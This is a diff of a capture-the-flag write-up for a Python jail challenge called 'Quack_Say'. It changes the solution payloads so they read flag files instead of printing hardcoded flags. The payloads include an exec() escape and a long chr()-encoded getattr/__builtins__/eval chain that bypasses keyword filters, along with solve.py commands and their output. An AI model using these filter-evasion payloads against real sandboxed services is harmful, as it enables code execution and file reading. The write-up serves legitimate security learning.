@@ -3,13 +3,13 @@
 For `jail1.py` -
 
 ```
-exec('import os, sys;sys.stdout = sys.__stdout__;print("CSeC{https://www.youtube.com/watch?v=dQw4w9WgXcQ}");sys.stdout = open(os.devnull, "w")')
+exec('import os, sys;sys.stdout = sys.__stdout__;flag = open("flag1.txt").read();print(flag);sys.stdout = open(os.devnull, "w")')
 ```
 
 For `jail2.py` -
 
 ```
-getattr(*(list(getattr(*(list(globals() for a in chr(1)) + list(chr(103)+chr(101)+chr(116) for a in chr(1))))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)) for a in chr(1)) + list(chr(101)+chr(118)+chr(97)+chr(108) for a in chr(1))))(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(39)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(44)+chr(32)+chr(115)+chr(121)+chr(115)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(115)+chr(121)+chr(115)+chr(46)+chr(95)+chr(95)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(95)+chr(95)+chr(59)+chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(34)+chr(67)+chr(83)+chr(101)+chr(67)+chr(123)+chr(81)+chr(117)+chr(52)+chr(99)+chr(107)+chr(95)+chr(49)+chr(53)+chr(95)+chr(104)+chr(49)+chr(98)+chr(51)+chr(114)+chr(110)+chr(52)+chr(55)+chr(49)+chr(110)+chr(103)+chr(125)+chr(34)+chr(41)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(111)+chr(115)+chr(46)+chr(100)+chr(101)+chr(118)+chr(110)+chr(117)+chr(108)+chr(108)+chr(44)+chr(32)+chr(34)+chr(119)+chr(34)+chr(41)+chr(39)+chr(41))
+getattr(*(list(getattr(*(list(globals() for a in chr(1)) + list(chr(103)+chr(101)+chr(116) for a in chr(1))))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)) for a in chr(1)) + list(chr(101)+chr(118)+chr(97)+chr(108) for a in chr(1))))(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(39)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(44)+chr(32)+chr(115)+chr(121)+chr(115)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(115)+chr(121)+chr(115)+chr(46)+chr(95)+chr(95)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(95)+chr(95)+chr(59)+chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(102)+chr(108)+chr(97)+chr(103)+chr(50)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(59)+chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(102)+chr(108)+chr(97)+chr(103)+chr(41)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(111)+chr(115)+chr(46)+chr(100)+chr(101)+chr(118)+chr(110)+chr(117)+chr(108)+chr(108)+chr(44)+chr(32)+chr(34)+chr(119)+chr(34)+chr(41)+chr(39)+chr(41))
 ```
 
 This was without a doubt the most gruelling problem of this set. I surely spent over 1 hour on `jail1.py` and maybe even 4-5 hours searching for different methods to solve `jail2.py`.
@@ -25,7 +25,8 @@ To get the required print output, I designed this piece of code -
 ```python
 import os, sys
 sys.stdout = sys.__stdout__
-print("CSeC{https://www.youtube.com/watch?v=dQw4w9WgXcQ}")
+flag = open("flag1.txt").read()
+print(flag)
 sys.stdout = open(os.devnull, "w")
 ```
 
@@ -81,7 +82,7 @@ def make_exploit(code):
 Using `make_exploit()` on the code 
 
 ```
-exec('import os, sys;sys.stdout = sys.__stdout__;print("CSeC{Qu4ck_15_h1b3rn471ng}");sys.stdout = open(os.devnull, "w")')
+exec('import os, sys;sys.stdout = sys.__stdout__;flag = open("flag2.txt").read();print(flag);sys.stdout = open(os.devnull, "w")')
 ```
 we finally generate a looooooooong input which does pass `file2.py` and we are done.
 
@@ -89,9 +90,9 @@ The final commands are -
 
 ```bash
 satyankar@Satyankars-MacBook-Air Quack_Say % python3 solve.py 1
-exec('import os, sys;sys.stdout = sys.__stdout__;print("CSeC{https://www.youtube.com/watch?v=dQw4w9WgXcQ}");sys.stdout = open(os.devnull, "w")')
+exec('import os, sys;sys.stdout = sys.__stdout__;flag = open("flag1.txt").read();print(flag);sys.stdout = open(os.devnull, "w")')
 satyankar@Satyankars-MacBook-Air Quack_Say % python3 solve.py 2
-getattr(*(list(getattr(*(list(globals() for a in chr(1)) + list(chr(103)+chr(101)+chr(116) for a in chr(1))))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)) for a in chr(1)) + list(chr(101)+chr(118)+chr(97)+chr(108) for a in chr(1))))(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(39)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(44)+chr(32)+chr(115)+chr(121)+chr(115)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(115)+chr(121)+chr(115)+chr(46)+chr(95)+chr(95)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(95)+chr(95)+chr(59)+chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(34)+chr(67)+chr(83)+chr(101)+chr(67)+chr(123)+chr(81)+chr(117)+chr(52)+chr(99)+chr(107)+chr(95)+chr(49)+chr(53)+chr(95)+chr(104)+chr(49)+chr(98)+chr(51)+chr(114)+chr(110)+chr(52)+chr(55)+chr(49)+chr(110)+chr(103)+chr(125)+chr(34)+chr(41)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(111)+chr(115)+chr(46)+chr(100)+chr(101)+chr(118)+chr(110)+chr(117)+chr(108)+chr(108)+chr(44)+chr(32)+chr(34)+chr(119)+chr(34)+chr(41)+chr(39)+chr(41))
+getattr(*(list(getattr(*(list(globals() for a in chr(1)) + list(chr(103)+chr(101)+chr(116) for a in chr(1))))(chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)) for a in chr(1)) + list(chr(101)+chr(118)+chr(97)+chr(108) for a in chr(1))))(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(39)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(44)+chr(32)+chr(115)+chr(121)+chr(115)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(115)+chr(121)+chr(115)+chr(46)+chr(95)+chr(95)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(95)+chr(95)+chr(59)+chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(102)+chr(108)+chr(97)+chr(103)+chr(50)+chr(46)+chr(116)+chr(120)+chr(116)+chr(34)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(59)+chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(102)+chr(108)+chr(97)+chr(103)+chr(41)+chr(59)+chr(115)+chr(121)+chr(115)+chr(46)+chr(115)+chr(116)+chr(100)+chr(111)+chr(117)+chr(116)+chr(32)+chr(61)+chr(32)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(111)+chr(115)+chr(46)+chr(100)+chr(101)+chr(118)+chr(110)+chr(117)+chr(108)+chr(108)+chr(44)+chr(32)+chr(34)+chr(119)+chr(34)+chr(41)+chr(39)+chr(41))
 ```
 
 ~~command for file2 doesn't fit in my terminal stdin lol and has to be sent via redirection.~~
